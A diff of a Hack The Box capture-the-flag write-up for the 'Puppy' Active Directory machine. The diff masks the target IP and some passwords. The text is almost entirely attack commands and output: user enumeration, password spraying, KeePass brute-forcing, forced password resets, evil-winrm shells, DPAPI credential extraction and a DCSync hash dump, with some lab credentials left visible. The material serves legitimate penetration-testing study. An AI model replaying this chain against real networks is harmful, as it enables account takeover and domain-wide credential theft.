@@ -16,9 +16,9 @@ Author: [tr3nb0lone](https://app.hackthebox.com/users/1600618)
 ## Enumeration
 ### Nmap
 ```bash
-└─$ sudo nmap -Pn -sC -sV 10.10.11.70    
+└─$ sudo nmap -Pn -sC -sV 10.10.xx.xx    
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-18 10:31 EDT
-Nmap scan report for 10.10.11.70
+Nmap scan report for 10.10.xx.xx
 Host is up (0.19s latency).
 Not shown: 985 filtered tcp ports (no-response)
 Bug in iscsi-info: no string output.
@@ -75,19 +75,19 @@ Nmap done: 1 IP address (1 host up) scanned in 234.96 seconds
 
 Now let's use `crackmapexec` to enumerate all the users in this domain.
 ```bash
-└─$ sudo crackmapexec smb 10.10.11.70 -u levi.james -p 'KingofAkron2025!' --users   
-SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
-SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025! 
-SMB         10.10.11.70     445    DC               [+] Enumerated domain user(s)
-SMB         10.10.11.70     445    DC               PUPPY.HTB\steph.cooper_adm               badpwdcount: 4 desc: 
-SMB         10.10.11.70     445    DC               PUPPY.HTB\steph.cooper                   badpwdcount: 0 desc: 
-SMB         10.10.11.70     445    DC               PUPPY.HTB\jamie.williams                 badpwdcount: 4 desc: 
-SMB         10.10.11.70     445    DC               PUPPY.HTB\adam.silver                    badpwdcount: 4 desc: 
-SMB         10.10.11.70     445    DC               PUPPY.HTB\ant.edwards                    badpwdcount: 4 desc: 
-SMB         10.10.11.70     445    DC               PUPPY.HTB\levi.james                     badpwdcount: 0 desc: 
-SMB         10.10.11.70     445    DC               PUPPY.HTB\krbtgt                         badpwdcount: 24 desc: Key Distribution Center Service Account
-SMB         10.10.11.70     445    DC               PUPPY.HTB\Guest                          badpwdcount: 24 desc: Built-in account for guest access to the computer/domain
-SMB         10.10.11.70     445    DC               PUPPY.HTB\Administrator                  badpwdcount: 24 desc: Built-in account for administering the computer/domain
+└─$ sudo crackmapexec smb 10.10.xx.xx -u levi.james -p 'KingofAkron2025!' --users   
+SMB         10.10.xx.xx     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
+SMB         10.10.xx.xx     445    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025! 
+SMB         10.10.xx.xx     445    DC               [+] Enumerated domain user(s)
+SMB         10.10.xx.xx     445    DC               PUPPY.HTB\steph.cooper_adm               badpwdcount: 4 desc: 
+SMB         10.10.xx.xx     445    DC               PUPPY.HTB\steph.cooper                   badpwdcount: 0 desc: 
+SMB         10.10.xx.xx     445    DC               PUPPY.HTB\jamie.williams                 badpwdcount: 4 desc: 
+SMB         10.10.xx.xx     445    DC               PUPPY.HTB\adam.silver                    badpwdcount: 4 desc: 
+SMB         10.10.xx.xx     445    DC               PUPPY.HTB\ant.edwards                    badpwdcount: 4 desc: 
+SMB         10.10.xx.xx     445    DC               PUPPY.HTB\levi.james                     badpwdcount: 0 desc: 
+SMB         10.10.xx.xx     445    DC               PUPPY.HTB\krbtgt                         badpwdcount: 24 desc: Key Distribution Center Service Account
+SMB         10.10.xx.xx     445    DC               PUPPY.HTB\Guest                          badpwdcount: 24 desc: Built-in account for guest access to the computer/domain
+SMB         10.10.xx.xx     445    DC               PUPPY.HTB\Administrator                  badpwdcount: 24 desc: Built-in account for administering the computer/domain
 ```
 
 We have some users, let's add them to the `users.txt` file and also add the domain to the `/etc/hosts` file.
@@ -96,7 +96,7 @@ We have some users, let's add them to the `users.txt` file and also add the doma
 <SNIP>
 # HTB Labs
 ## DEPTHS Season 8
-10.10.11.70     PUPPY.HTB DC.PUPPY.HTB
+10.10.xx.xx     PUPPY.HTB DC.PUPPY.HTB
 ```
 
 ```bash
@@ -115,7 +115,7 @@ steph.cooper_adm
 
 Now we use `smbmap` to enumerate the shares.
 ```bash
-└─$ smbmap -H 10.10.11.70 -u 'levi.james' -p 'KingofAkron2025!'
+└─$ smbmap -H 10.10.xx.xx -u 'levi.james' -p 'KingofAkron2025!'
 
     ________  ___      ___  _______   ___      ___       __         _______
    /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
@@ -131,7 +131,7 @@ SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
 [*] Detected 1 hosts serving SMB                                                                                                  
 [*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                              
-[+] IP: 10.10.11.70:445 Name: PUPPY.HTB                 Status: Authenticated
+[+] IP: 10.10.xx.xx:445 Name: PUPPY.HTB                 Status: Authenticated
         Disk                                                    Permissions     Comment
         ----                                                    -----------     -------
         ADMIN$                                                  NO ACCESS       Remote Admin
@@ -148,7 +148,7 @@ Look closure, we have a `DEV` share but our user does not have the access rights
 
 ### Bloodhound
 ```bash
-└─$ bloodhound-python -dc DC.PUPPY.HTB -u 'levi.james' -p 'KingofAkron2025!' -d PUPPY.HTB -c All -o bloodhound_results.json -ns 10.10.11.70
+└─$ bloodhound-python -dc DC.PUPPY.HTB -u 'levi.james' -p 'KingofAkron2025!' -d PUPPY.HTB -c All -o bloodhound_results.json -ns 10.10.xx.xx
 INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
 INFO: Found AD domain: puppy.htb
 INFO: Getting TGT for user
@@ -190,12 +190,12 @@ member: CN=Levi B. James,OU=MANPOWER,DC=PUPPY,DC=HTB
 ```
 
 ```bash
-└─$ ldapmodify -x -H ldap://10.10.11.70 -D "levi.james@puppy.htb" -w 'KingofAkron2025!' -f modify.ldif
+└─$ ldapmodify -x -H ldap://10.10.xx.xx -D "levi.james@puppy.htb" -w 'KingofAkron2025!' -f modify.ldif
 modifying entry "CN=DEVELOPERS,DC=PUPPY,DC=HTB"
 ```
 
 ```bash
-└─$ smbclient -U 'puppy.htb/levi.james%KingofAkron2025!' //10.10.11.70/DEV                            
+└─$ smbclient -U 'puppy.htb/levi.james%KingofAkron2025!' //10.10.xx.xx/DEV                            
 Try "help" to get a list of possible commands.
 smb: \> dir
   .                                  DR        0  Sun May 18 12:46:39 2025
@@ -213,12 +213,12 @@ smb: \>
 2. Use [bloodyAD](https://github.com/CravateRouge/bloodyAD) to add the user to the group.
 
 ```bash
-└─$ bloodyAD --host 10.10.11.70 -d PUPPY.HTB -u 'levi.james' -p 'KingofAkron2025!' add groupMember DEVELOPERS levi.james
+└─$ bloodyAD --host 10.10.xx.xx -d PUPPY.HTB -u 'levi.james' -p 'KingofAkron2025!' add groupMember DEVELOPERS levi.james
 [+] levi.james added to DEVELOPERS
 ```
 
 ```bash
-└─$ smbmap -H 10.10.11.70 -u 'levi.james' -p 'KingofAkron2025!'           
+└─$ smbmap -H 10.10.xx.xx -u 'levi.james' -p 'KingofAkron2025!'           
 
     ________  ___      ___  _______   ___      ___       __         _______
    /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
@@ -234,7 +234,7 @@ SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
 [*] Detected 1 hosts serving SMB                                                                                                  
 [*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                              
-[+] IP: 10.10.11.70:445 Name: PUPPY.HTB                 Status: Authenticated
+[+] IP: 10.10.xx.xx:445 Name: PUPPY.HTB                 Status: Authenticated
         Disk                                                    Permissions     Comment
         ----                                                    -----------     -------
         ADMIN$                                                  NO ACCESS       Remote Admin
@@ -274,12 +274,12 @@ keepass4brute 1.3 by r3nt0n
 https://github.com/r3nt0n/keepass4brute
 
 [+] Words tested: 36/14344392 - Attempts per minute: 27 - Estimated time remaining: 52 weeks, 4 days
-[+] Current attempt: liverpool
+[+] Current attempt: liverxxxx
 
-[*] Password found: liverpool
+[*] Password found: liverxxxx
 ```
 
-Got the password `liverpool`, now use `keepassxc` to export file to `xml` format.
+Got the password `liverxxxx`, now use `keepassxc` to export file to `xml` format.
 ```bash
 └─$ keepassxc-cli export --format=xml recovery.kdbx > keepass_dump.xml                                
 Enter password to unlock recovery.kdbx:
@@ -299,65 +299,65 @@ ILY2025!
 
 Let's use `crackmapexec` to password spray the users.
 ```bash
-└─$ sudo crackmapexec smb 10.10.11.70 -u users.txt -p passwords_recovery.txt --continue-on-success
-SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
-SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\Administrator:JamieLove2025! STATUS_LOGON_FAILURE 
-SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\Administrator:HJKL2025! STATUS_LOGON_FAILURE 
-SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\Administrator:Antman2025! STATUS_LOGON_FAILURE 
-SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\Administrator:Steve2025! STATUS_LOGON_FAILURE 
-SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\Administrator:ILY2025! STATUS_LOGON_FAILURE 
-SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\Guest:JamieLove2025! STATUS_LOGON_FAILURE 
-SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\Guest:HJKL2025! STATUS_LOGON_FAILURE 
-SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\Guest:Antman2025! STATUS_LOGON_FAILURE 
-SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\Guest:Steve2025! STATUS_LOGON_FAILURE 
-SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\Guest:ILY2025! STATUS_LOGON_FAILURE 
-SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\krbtgt:JamieLove2025! STATUS_LOGON_FAILURE 
-SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\krbtgt:HJKL2025! STATUS_LOGON_FAILURE 
-SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\krbtgt:Antman2025! STATUS_LOGON_FAILURE 
-SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\krbtgt:Steve2025! STATUS_LOGON_FAILURE 
-SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\krbtgt:ILY2025! STATUS_LOGON_FAILURE 
-SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\DC$:JamieLove2025! STATUS_LOGON_FAILURE 
-SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\DC$:HJKL2025! STATUS_LOGON_FAILURE 
-SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\DC$:Antman2025! STATUS_LOGON_FAILURE 
-SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\DC$:Steve2025! STATUS_LOGON_FAILURE 
-SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\DC$:ILY2025! STATUS_LOGON_FAILURE 
-SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\levi.james:JamieLove2025! STATUS_LOGON_FAILURE 
-SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\levi.james:HJKL2025! STATUS_LOGON_FAILURE 
-SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\levi.james:Antman2025! STATUS_LOGON_FAILURE 
-SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\levi.james:Steve2025! STATUS_LOGON_FAILURE 
-SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\levi.james:ILY2025! STATUS_LOGON_FAILURE 
-SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\ant.edwards:JamieLove2025! STATUS_LOGON_FAILURE 
-SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\ant.edwards:HJKL2025! STATUS_LOGON_FAILURE 
-SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\ant.edwards:Antman2025! 
-SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\ant.edwards:Steve2025! STATUS_LOGON_FAILURE 
-SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\ant.edwards:ILY2025! STATUS_LOGON_FAILURE 
-SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\adam.silver:JamieLove2025! STATUS_LOGON_FAILURE 
-SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\adam.silver:HJKL2025! STATUS_LOGON_FAILURE 
-SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\adam.silver:Antman2025! STATUS_LOGON_FAILURE 
-SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\adam.silver:Steve2025! STATUS_LOGON_FAILURE 
-SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\adam.silver:ILY2025! STATUS_LOGON_FAILURE 
-SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\jamie.williams:JamieLove2025! STATUS_LOGON_FAILURE 
-SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\jamie.williams:HJKL2025! STATUS_LOGON_FAILURE 
-SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\jamie.williams:Antman2025! STATUS_LOGON_FAILURE 
-SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\jamie.williams:Steve2025! STATUS_LOGON_FAILURE 
-SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\jamie.williams:ILY2025! STATUS_LOGON_FAILURE 
-SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\steph.cooper:JamieLove2025! STATUS_LOGON_FAILURE 
-SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\steph.cooper:HJKL2025! STATUS_LOGON_FAILURE 
-SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\steph.cooper:Antman2025! STATUS_LOGON_FAILURE 
-SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\steph.cooper:Steve2025! STATUS_LOGON_FAILURE 
-SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\steph.cooper:ILY2025! STATUS_LOGON_FAILURE 
-SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\steph.cooper_adm:JamieLove2025! STATUS_LOGON_FAILURE 
-SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\steph.cooper_adm:HJKL2025! STATUS_LOGON_FAILURE 
-SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\steph.cooper_adm:Antman2025! STATUS_LOGON_FAILURE 
-SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\steph.cooper_adm:Steve2025! STATUS_LOGON_FAILURE 
-SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\steph.cooper_adm:ILY2025! STATUS_LOGON_FAILURE
+└─$ sudo crackmapexec smb 10.10.xx.xx -u users.txt -p passwords_recovery.txt --continue-on-success
+SMB         10.10.xx.xx     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
+SMB         10.10.xx.xx     445    DC               [-] PUPPY.HTB\Administrator:JamieLove2025! STATUS_LOGON_FAILURE 
+SMB         10.10.xx.xx     445    DC               [-] PUPPY.HTB\Administrator:HJKL2025! STATUS_LOGON_FAILURE 
+SMB         10.10.xx.xx     445    DC               [-] PUPPY.HTB\Administrator:Antman2025! STATUS_LOGON_FAILURE 
+SMB         10.10.xx.xx     445    DC               [-] PUPPY.HTB\Administrator:Steve2025! STATUS_LOGON_FAILURE 
+SMB         10.10.xx.xx     445    DC               [-] PUPPY.HTB\Administrator:ILY2025! STATUS_LOGON_FAILURE 
+SMB         10.10.xx.xx     445    DC               [-] PUPPY.HTB\Guest:JamieLove2025! STATUS_LOGON_FAILURE 
+SMB         10.10.xx.xx     445    DC               [-] PUPPY.HTB\Guest:HJKL2025! STATUS_LOGON_FAILURE 
+SMB         10.10.xx.xx     445    DC               [-] PUPPY.HTB\Guest:Antman2025! STATUS_LOGON_FAILURE 
+SMB         10.10.xx.xx     445    DC               [-] PUPPY.HTB\Guest:Steve2025! STATUS_LOGON_FAILURE 
+SMB         10.10.xx.xx     445    DC               [-] PUPPY.HTB\Guest:ILY2025! STATUS_LOGON_FAILURE 
+SMB         10.10.xx.xx     445    DC               [-] PUPPY.HTB\krbtgt:JamieLove2025! STATUS_LOGON_FAILURE 
+SMB         10.10.xx.xx     445    DC               [-] PUPPY.HTB\krbtgt:HJKL2025! STATUS_LOGON_FAILURE 
+SMB         10.10.xx.xx     445    DC               [-] PUPPY.HTB\krbtgt:Antman2025! STATUS_LOGON_FAILURE 
+SMB         10.10.xx.xx     445    DC               [-] PUPPY.HTB\krbtgt:Steve2025! STATUS_LOGON_FAILURE 
+SMB         10.10.xx.xx     445    DC               [-] PUPPY.HTB\krbtgt:ILY2025! STATUS_LOGON_FAILURE 
+SMB         10.10.xx.xx     445    DC               [-] PUPPY.HTB\DC$:JamieLove2025! STATUS_LOGON_FAILURE 
+SMB         10.10.xx.xx     445    DC               [-] PUPPY.HTB\DC$:HJKL2025! STATUS_LOGON_FAILURE 
+SMB         10.10.xx.xx     445    DC               [-] PUPPY.HTB\DC$:Antman2025! STATUS_LOGON_FAILURE 
+SMB         10.10.xx.xx     445    DC               [-] PUPPY.HTB\DC$:Steve2025! STATUS_LOGON_FAILURE 
+SMB         10.10.xx.xx     445    DC               [-] PUPPY.HTB\DC$:ILY2025! STATUS_LOGON_FAILURE 
+SMB         10.10.xx.xx     445    DC               [-] PUPPY.HTB\levi.james:JamieLove2025! STATUS_LOGON_FAILURE 
+SMB         10.10.xx.xx     445    DC               [-] PUPPY.HTB\levi.james:HJKL2025! STATUS_LOGON_FAILURE 
+SMB         10.10.xx.xx     445    DC               [-] PUPPY.HTB\levi.james:Antman2025! STATUS_LOGON_FAILURE 
+SMB         10.10.xx.xx     445    DC               [-] PUPPY.HTB\levi.james:Steve2025! STATUS_LOGON_FAILURE 
+SMB         10.10.xx.xx     445    DC               [-] PUPPY.HTB\levi.james:ILY2025! STATUS_LOGON_FAILURE 
+SMB         10.10.xx.xx     445    DC               [-] PUPPY.HTB\ant.edwards:JamieLove2025! STATUS_LOGON_FAILURE 
+SMB         10.10.xx.xx     445    DC               [-] PUPPY.HTB\ant.edwards:HJKL2025! STATUS_LOGON_FAILURE 
+SMB         10.10.xx.xx     445    DC               [+] PUPPY.HTB\ant.edwards:Antman2025! 
+SMB         10.10.xx.xx     445    DC               [-] PUPPY.HTB\ant.edwards:Steve2025! STATUS_LOGON_FAILURE 
+SMB         10.10.xx.xx     445    DC               [-] PUPPY.HTB\ant.edwards:ILY2025! STATUS_LOGON_FAILURE 
+SMB         10.10.xx.xx     445    DC               [-] PUPPY.HTB\adam.silver:JamieLove2025! STATUS_LOGON_FAILURE 
+SMB         10.10.xx.xx     445    DC               [-] PUPPY.HTB\adam.silver:HJKL2025! STATUS_LOGON_FAILURE 
+SMB         10.10.xx.xx     445    DC               [-] PUPPY.HTB\adam.silver:Antman2025! STATUS_LOGON_FAILURE 
+SMB         10.10.xx.xx     445    DC               [-] PUPPY.HTB\adam.silver:Steve2025! STATUS_LOGON_FAILURE 
+SMB         10.10.xx.xx     445    DC               [-] PUPPY.HTB\adam.silver:ILY2025! STATUS_LOGON_FAILURE 
+SMB         10.10.xx.xx     445    DC               [-] PUPPY.HTB\jamie.williams:JamieLove2025! STATUS_LOGON_FAILURE 
+SMB         10.10.xx.xx     445    DC               [-] PUPPY.HTB\jamie.williams:HJKL2025! STATUS_LOGON_FAILURE 
+SMB         10.10.xx.xx     445    DC               [-] PUPPY.HTB\jamie.williams:Antman2025! STATUS_LOGON_FAILURE 
+SMB         10.10.xx.xx     445    DC               [-] PUPPY.HTB\jamie.williams:Steve2025! STATUS_LOGON_FAILURE 
+SMB         10.10.xx.xx     445    DC               [-] PUPPY.HTB\jamie.williams:ILY2025! STATUS_LOGON_FAILURE 
+SMB         10.10.xx.xx     445    DC               [-] PUPPY.HTB\steph.cooper:JamieLove2025! STATUS_LOGON_FAILURE 
+SMB         10.10.xx.xx     445    DC               [-] PUPPY.HTB\steph.cooper:HJKL2025! STATUS_LOGON_FAILURE 
+SMB         10.10.xx.xx     445    DC               [-] PUPPY.HTB\steph.cooper:Antman2025! STATUS_LOGON_FAILURE 
+SMB         10.10.xx.xx     445    DC               [-] PUPPY.HTB\steph.cooper:Steve2025! STATUS_LOGON_FAILURE 
+SMB         10.10.xx.xx     445    DC               [-] PUPPY.HTB\steph.cooper:ILY2025! STATUS_LOGON_FAILURE 
+SMB         10.10.xx.xx     445    DC               [-] PUPPY.HTB\steph.cooper_adm:JamieLove2025! STATUS_LOGON_FAILURE 
+SMB         10.10.xx.xx     445    DC               [-] PUPPY.HTB\steph.cooper_adm:HJKL2025! STATUS_LOGON_FAILURE 
+SMB         10.10.xx.xx     445    DC               [-] PUPPY.HTB\steph.cooper_adm:Antman2025! STATUS_LOGON_FAILURE 
+SMB         10.10.xx.xx     445    DC               [-] PUPPY.HTB\steph.cooper_adm:Steve2025! STATUS_LOGON_FAILURE 
+SMB         10.10.xx.xx     445    DC               [-] PUPPY.HTB\steph.cooper_adm:ILY2025! STATUS_LOGON_FAILURE
 ```
 
 &rarr; After spraying, there is only one valid credential `ant.edwards:Antman2025!`.
 
 Let's continue enumerate `ant.edwards` machine with further information through `bloodhound`.
 ```bash
-└─$ bloodhound-python -dc DC.PUPPY.HTB -u 'ant.edwards' -p 'Antman2025!' -d PUPPY.HTB -c All -o bloodhound_results.json -ns 10.10.11.70
+└─$ bloodhound-python -dc DC.PUPPY.HTB -u 'ant.edwards' -p 'Antman2025!' -d PUPPY.HTB -c All -o bloodhound_results.json -ns 10.10.xx.xx
 INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
 INFO: Found AD domain: puppy.htb
 INFO: Getting TGT for user
@@ -393,7 +393,7 @@ Found out that `ant.edwards` is a member of `SENIOR DEVS@PUPPY.HTB` group and ha
 1. We can use `bloodyAD` to change the password of `ADAM.SILVER@PUPPY.HTB`.
 
 ```bash
-└─$ bloodyAD -u ant.edwards -p 'Antman2025!' -d puppy.htb --dc-ip 10.10.11.70 set password adam.silver 'P@ssw4rd123'
+└─$ bloodyAD -u ant.edwards -p 'Antman2025!' -d puppy.htb --dc-ip 10.10.xx.xx set password adam.silver 'P@ssw4rd123'
 [+] Password changed successfully!
 ```
 
@@ -423,7 +423,7 @@ userAccountControl: 512
 ```
 
 ```bash
-└─$ ldapmodify -x -H ldap://10.10.11.70 -D "ant.edwards@puppy.htb" -w 'Antman2025!' -f modify.ldif
+└─$ ldapmodify -x -H ldap://10.10.xx.xx -D "ant.edwards@puppy.htb" -w 'Antman2025!' -f modify.ldif
 modifying entry "CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB"
 ```
 
@@ -434,17 +434,17 @@ SMB         PUPPY.HTB       445    DC               [+] PUPPY.HTB\ADAM.SILVER:P@
 ```
 
 ```bash
-└─$ sudo crackmapexec winrm 10.10.11.70 -u 'ADAM.SILVER' -p 'P@ssw4rd123' -d PUPPY.HTB            
-HTTP        10.10.11.70     5985   10.10.11.70      [*] http://10.10.11.70:5985/wsman
+└─$ sudo crackmapexec winrm 10.10.xx.xx -u 'ADAM.SILVER' -p 'P@ssw4rd123' -d PUPPY.HTB            
+HTTP        10.10.xx.xx     5985   10.10.xx.xx      [*] http://10.10.xx.xx:5985/wsman
 /usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
   arc4 = algorithms.ARC4(self._key)
-WINRM       10.10.11.70     5985   10.10.11.70      [+] PUPPY.HTB\ADAM.SILVER:P@ssw4rd123 (Pwn3d!)
+WINRM       10.10.xx.xx     5985   10.10.xx.xx      [+] PUPPY.HTB\ADAM.SILVER:P@ssw4rd123 (Pwn3d!)
 ```
 
 &rarr; Confirm that we can change the password of `ADAM.SILVER` user and success `Pwn3d!`.
 
 ```
-└─$ evil-winrm -i 10.10.11.70 -u 'ADAM.SILVER' -p 'P@ssw4rd123'
+└─$ evil-winrm -i 10.10.xx.xx -u 'ADAM.SILVER' -p 'P@ssw4rd123'
                                         
 Evil-WinRM shell v3.7
                                         
@@ -459,13 +459,13 @@ Info: Establishing connection to remote endpoint
 2. Another approach can use [ForceChangePassword](https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword) through `rpc`.
 
 ```bash
-└─$ net rpc password 'adam.silver' 'P@ssw4rd123' -U 'PUPPY.HTB'/'ant.edwards'%'Antman2025!' -S '10.10.11.70'
+└─$ net rpc password 'adam.silver' 'P@ssw4rd123' -U 'PUPPY.HTB'/'ant.edwards'%'Antman2025!' -S '10.10.xx.xx'
 ```
 
 or we can use `rpcclient`.
 
 ```bash
-└─$ rpcclient -U 'puppy.htb\Ant.Edwards%Antman2025!' 10.10.11.70
+└─$ rpcclient -U 'puppy.htb\Ant.Edwards%Antman2025!' 10.10.xx.xx
 rpcclient $> setuserinfo adam.silver 23 P@ssw4rd123
 rpcclient $>
 ```
@@ -486,7 +486,7 @@ Mode                 LastWriteTime         Length Name
 
 
 *Evil-WinRM* PS C:\Users\adam.silver\Desktop> type user.txt
-79afddddb29edcf847aa40e5edfd7e0c
+79afddxxxxxxxxxxxxxxxxxxxxxxxxxx
 ```
 
 Let's continue discover to find the `root.txt` flag.
@@ -494,7 +494,7 @@ Let's continue discover to find the `root.txt` flag.
 ## Privilege Escalation
 So let's do the `BloodHound` again on `adam.silver` account.
 ```bash
-└─$ bloodhound-python -dc DC.PUPPY.HTB -u 'adam.silver' -p 'P@ssw4rd123' -d PUPPY.HTB -c All -o bloodhound_results.json -ns 10.10.11.70
+└─$ bloodhound-python -dc DC.PUPPY.HTB -u 'adam.silver' -p 'P@ssw4rd123' -d PUPPY.HTB -c All -o bloodhound_results.json -ns 10.10.xx.xx
 INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
 INFO: Found AD domain: puppy.htb
 INFO: Getting TGT for user
@@ -610,7 +610,7 @@ Hmm, `nms-auth-config.xml.bak` file looks interesting, let's `cat` it out.
         <port>389</port>
         <base-dn>dc=PUPPY,dc=HTB</base-dn>
         <bind-dn>cn=steph.cooper,dc=puppy,dc=htb</bind-dn>
-        <bind-password>ChefSteph2025!</bind-password>
+        <bind-password>ChefStephxxxxx</bind-password>
     </server>
     <user-attributes>
         <attribute name="username" ldap-attribute="uid" />
@@ -628,10 +628,10 @@ Hmm, `nms-auth-config.xml.bak` file looks interesting, let's `cat` it out.
 </ldap-config>
 ```
 
-Okay, found another credential `ChefSteph2025!` and we can use it to login to `steph.cooper` account.
+Okay, found another credential `ChefStephxxxxx` and we can use it to login to `steph.cooper` account.
 
 ```
-└─$ evil-winrm -i 10.10.11.70 -u steph.cooper -p 'ChefSteph2025!' 
+└─$ evil-winrm -i 10.10.xx.xx -u steph.cooper -p 'ChefStephxxxxx' 
                                         
 Evil-WinRM shell v3.7
                                         
@@ -699,13 +699,13 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
 [*] Config file parsed
 [*] Config file parsed
-[*] Incoming connection (10.10.11.70,53298)
+[*] Incoming connection (10.10.xx.xx,53298)
 [*] AUTHENTICATE_MESSAGE (\,DC)
 [*] User DC\ authenticated successfully
 [*] :::00::aaaaaaaaaaaaaaaa
 [*] Connecting Share(1:share)
 [*] Disconnecting Share(1:share)
-[*] Closing down connection (10.10.11.70,53298)
+[*] Closing down connection (10.10.xx.xx,53298)
 [*] Remaining connections []
 ```
 
@@ -718,7 +718,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 Now we have all the files we need, let's extract the credentials.
 
 ```bash
-└─$ python3 /usr/share/doc/python3-impacket/examples/dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 -password 'ChefSteph2025!' -sid S-1-5-21-1487982659-1829050783-2281216199-1107 
+└─$ python3 /usr/share/doc/python3-impacket/examples/dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 -password 'ChefStephxxxxx' -sid S-1-5-21-1487982659-1829050783-2281216199-1107 
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
 [MASTERKEYFILE]
@@ -748,15 +748,15 @@ Target      : Domain:target=PUPPY.HTB
 Description : 
 Unknown     : 
 Username    : steph.cooper_adm
-Unknown     : FivethChipOnItsWay2025!
+Unknown     : FivethChipOnItsWayxxxxx
 ```
 
-&rarr; Found password `FivethChipOnItsWay2025!` for `steph.cooper_adm`.
+&rarr; Found password `FivethChipOnItsWayxxxxx` for `steph.cooper_adm`.
 
 Use `BloodHound` again.
 
 ```bash
-└─$ bloodhound-python -dc DC.PUPPY.HTB -u 'steph.cooper_adm' -p 'FivethChipOnItsWay2025!' -d PUPPY.HTB -c All -o bloodhound_results.json -ns 10.10.11.70
+└─$ bloodhound-python -dc DC.PUPPY.HTB -u 'steph.cooper_adm' -p 'FivethChipOnItsWayxxxxx' -d PUPPY.HTB -c All -o bloodhound_results.json -ns 10.10.xx.xx
 INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
 INFO: Found AD domain: puppy.htb
 INFO: Getting TGT for user
@@ -788,88 +788,38 @@ Found out that `steph.cooper_adm` has `DCSync`. <br>
 &rarr; We can use `DCSync` attack to dump all the credentials of `Administrator` account.
 
 ```bash
-└─$ secretsdump.py 'PUPPY.HTB/steph.cooper_adm:FivethChipOnItsWay2025!'@10.10.11.70
+└─$ secretsdump.py 'PUPPY.HTB/steph.cooper_adm:FivethChipOnItsWayxxxxx'@10.10.xx.xx
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Service RemoteRegistry is in stopped state
